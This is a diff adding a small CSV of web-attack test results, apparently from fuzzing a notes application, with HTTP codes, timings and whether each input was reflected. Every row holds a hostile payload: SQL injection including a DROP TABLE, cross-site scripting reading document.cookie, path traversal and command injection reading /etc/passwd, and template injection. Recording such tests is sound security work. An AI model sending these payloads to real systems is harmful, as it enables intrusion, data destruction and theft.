@@ -1,0 +1,13 @@
+id,payload,http_code,tiempo_ms,bytes,reflejado
+1,"' OR '1'='1",201,114,35,si
+2,"'; DROP TABLE notes;--",201,10,35,si
+3,"1' UNION SELECT NULL;NULL;NULL--",201,12,35,si
+4,"<script>alert(document.cookie)</scr",201,11,35,si
+5,"<img src=x onerror=alert(1)>",201,12,35,si
+6,"javascript:alert(1)",201,12,35,si
+7,"../../../../etc/passwd",201,11,35,si
+8,"$(id)",201,11,35,si
+9,"; cat /etc/passwd",201,11,35,si
+10,"{{7*7}}",201,11,35,si
+11,"%00",201,11,35,si
+12,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",500,10,265,no
